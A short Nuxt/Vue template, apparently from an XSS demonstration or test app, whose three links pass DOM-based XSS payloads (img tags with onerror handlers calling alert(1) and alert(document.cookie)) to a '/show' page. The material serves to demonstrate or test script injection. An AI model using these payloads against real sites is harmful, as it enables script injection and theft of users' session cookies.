<template>
  <div>
    <ul>
      <li>
        <nuxt-link to='/show?name=<img%20src%3D"hoge"%20onerror%3Dalert%281%29>'>DOM-Based-XSS</nuxt-link>
      </li>
      <li>
        <nuxt-link to='/show?name=<img src="hoge" onerror=alert(1)>'>DOM-Based-XSS 2</nuxt-link>
      </li>
      <li>
        <nuxt-link to='/show?name=<img src="hoge" onerror=alert(document.cookie)>'>DOM-Based-XSS 3</nuxt-link>
      </li>
    </ul>
  </div>
</template>
